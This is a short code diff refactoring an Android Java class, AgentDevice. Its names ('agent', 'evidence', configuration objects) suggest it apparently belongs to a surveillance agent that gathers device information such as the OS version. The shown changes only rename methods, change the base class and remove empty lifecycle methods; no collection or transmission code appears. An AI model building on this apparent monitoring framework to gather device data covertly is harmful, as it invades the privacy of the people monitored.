@@ -28,6 +28,7 @@ import com.android.service.LogR;
 import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAgent;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.util.Check;
 import com.android.service.util.Utils;
@@ -40,7 +41,7 @@ import com.android.service.util.WChar;
  * @author zeno
  * 
  */
-public class AgentDevice extends BaseAgent {
+public class AgentDevice extends BaseInstantAgent {
 
 	/** The Constant TAG. */
 	private static final String TAG = "AgentDevice"; //$NON-NLS-1$
@@ -72,19 +73,9 @@ public class AgentDevice extends BaseAgent {
 	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
 	 */
 	@Override
-	public boolean parse(AgentConf conf) {		
+	public boolean parse(ConfAgent conf) {		
 		this.processList = true;
 		return true;
-	}
-
-	/*
-	 * (non-Javadoc)
-	 * 
-	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#begin()
-	 */
-	@Override
-	public void begin() {
-		setPeriod(NEVER);
 	}
 
 	/*
@@ -93,7 +84,7 @@ public class AgentDevice extends BaseAgent {
 	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
 	 */
 	@Override
-	public void go() {
+	public void actualStart() {
 
 		// OS Version etc...
 		if (Cfg.DEBUG) {
@@ -206,16 +197,6 @@ public class AgentDevice extends BaseAgent {
 				Check.log(ex);//$NON-NLS-1$
 			}
 		}
-	}
-
-	/*
-	 * (non-Javadoc)
-	 * 
-	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#end()
-	 */
-	@Override
-	public void end() {
-
 	}
 
 	/**
